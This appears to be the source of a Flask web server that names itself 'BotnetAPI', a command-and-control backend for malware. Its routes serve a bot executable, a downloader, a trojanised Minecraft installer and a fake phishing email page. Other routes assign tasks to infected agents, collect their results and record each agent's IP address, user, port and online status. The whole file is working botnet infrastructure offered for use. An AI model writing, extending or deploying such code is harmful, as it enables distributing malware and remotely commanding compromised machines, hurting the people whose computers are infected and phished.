from flask import request, jsonify, Flask, send_file
from pymongo import MongoClient
from bson.objectid import ObjectId
import json
import os
import datetime
from datetime import timedelta, timezone
import threading
import time


app = Flask(__name__)
# app.config.from_file('./secrets/config.json', load=json.load)
DOWNLOAD_PATH = os.path.dirname(os.path.abspath(__file__)) + "/downloads"

#Agents
agents_dict = dict()

#tasks, where the task is an url
tasks = {"/task1": 0, "/task2": 0, "/task3": 0}

def superintendent():
    """
    background function, scheduler and supervisor
    """
    for key, value in agents_dict.items():
        difference = datetime.datetime.now() - value['last_connected']
        print(difference.seconds//60)
        if (difference.seconds//60) > 5:
            print('older')
            agents_dict[key]['status'] = "offline"
    print(agents_dict)
    time.sleep(5)

threading.Thread(target=superintendent).start()

#### API Endpoints ####

@app.route('/', methods=['GET'])
def home():
    return '''<h1>BotnetAPI - Secured database to store all your malware</h1>
                <p>A flask api implementation for malware.   </p>'''

@app.route('/MainDownloader', methods=['GET'])
def getMainDownloader():
    return send_file(os.path.join(DOWNLOAD_PATH, "MainDownloader.exe"))

@app.route('/malware', methods=['GET'])
def getMalware():
    return send_file(os.path.join(DOWNLOAD_PATH, "botScript.exe"))

@app.route('/minecraft', methods=['GET'])
def getMinecraftv():
    return send_file(os.path.join(DOWNLOAD_PATH, "Minecraft_Infected.exe"))

@app.route('/email', methods=['GET'])
def getEmail():
    return send_file(os.path.join(DOWNLOAD_PATH, "fake_email.html"))

@app.route('/task1', methods=['GET'])
def getTask1():
    #add path from static folder
    return send_file(os.path.join(DOWNLOAD_PATH, "times.exe"))

@app.route('/task2', methods=['GET'])
def getTask2():
    #add path from static folder
    return send_file(os.path.join(DOWNLOAD_PATH, "times.exe"))

@app.route('/task3', methods=['GET'])
def getTask3():
    #add path from static folder
    return send_file(os.path.join(DOWNLOAD_PATH, "times.exe"))

@app.route('/agent', methods=['POST'])
def report_result():
    agent_ip = request.remote_addr
    agent_user = request.remote_user
    #agent_last_connected = request.date
    port = request.environ['REMOTE_PORT']
    current_time = datetime.datetime.now()

    if agent_ip not in agents_dict:
        agents_dict[agent_ip] = {"ip": agent_ip , "user": agent_user, "last_connected": current_time, "port": port,"status": "online", "task": "", "results": [request.json['result']]}
        #print(agents_dict)
    else:
        agents_dict[agent_ip]['status'] = "online"
        agents_dict[agent_ip]['task'] = ""
        agents_dict[agent_ip]['results'].append(request.json['result'])
        print(request.json['result'])

    return "Thank you"


@app.route('/agent', methods=['GET'])
def reporting_for_duty():
    agent_ip = request.remote_addr
    agent_user = request.remote_user
    #agent_last_connected = request.date
    port = request.environ['REMOTE_PORT']
    current_time = datetime.datetime.now()

    current_task = min(tasks, key=tasks.get) #gives the key with the lowest count

    if agent_ip not in agents_dict:
        agents_dict[agent_ip] = {"ip": agent_ip , "user": agent_user, "last_connected": current_time, "port": port, "status": "working", "task": current_task, "results": list()}

        tasks[current_task] += 1 # increase the count of the task since an agent is working on it
        return {"url": current_task}
    else:
        agents_dict[agent_ip]['status'] = "working"
        agents_dict[agent_ip]['task'] = current_task

        tasks[current_task] += 1 # increase the count of the task since an agent is working on it
        return {"url": current_task}

@app.route('/agent/status', methods=['GET'])
def get_agent_status():
    return agents_dict

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=80)
    #threading.Timer(5.0, superintendent).start()